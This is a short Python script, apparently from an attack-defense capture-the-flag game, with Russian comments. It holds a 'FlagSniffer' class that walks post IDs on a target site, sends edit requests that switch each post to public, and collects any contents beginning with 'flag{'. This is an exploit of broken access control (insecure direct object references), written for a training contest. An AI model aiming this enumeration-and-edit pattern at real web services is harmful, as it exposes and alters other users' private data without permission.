from bs4 import BeautifulSoup

ID_CHECK_DEPTH = 8

class FlagSniffer:


    def __init__(self, session, url, flags_file, headers):
        self.session = session
        self.url = url
        self.flags_file = flags_file
        self.headers = headers


    def sniff(self):

        f = open(self.flags_file, "r+")
        old_flags = {i.strip() for i in f.readlines()}
        
        new_flags = set()
       

        url_posts = self.url + "posts/edit/"    
        data = {"visibility": "public"}
        print("Начал проверять ID'шники...")
        do_not_exist_number = 0
        for id in range(0, 100):
            post_id_request = self.session.post(url_posts+str(id), data, headers=self.headers)
            if post_id_request.status_code == 200:
                # сбрасываем счетчик несуществующих ID
                do_not_exist_number = 0
                                
                # Парсим JSON ответ
                json_data = post_id_request.json()
                

                # Извлекаем контент из JSON
                content = json_data.get("post", {}).get("content", "")
                
                # Ищем флаг в формате flag{...}
                if content.startswith("flag{"):
                    new_flags.add(content)
                       
            else:
                do_not_exist_number += 1
                if do_not_exist_number >= ID_CHECK_DEPTH:
                    print(f"{ID_CHECK_DEPTH} подряд ID'шников не существуют, прекращаю поиск...")
                    break
            
        flags = new_flags.difference(old_flags)

        # Добавляем новые флаги в файл
        for i in flags:
            f.write(i+"\n")
        
        f.close()
        flag_length = len(flags) 
        if flag_length > 0:
            print(f"Я нашел новые флаги! Их целых {flag_length} штук")        
        if flag_length == 0:
            print('Новых флагов не найдено 😭')
        return flags
    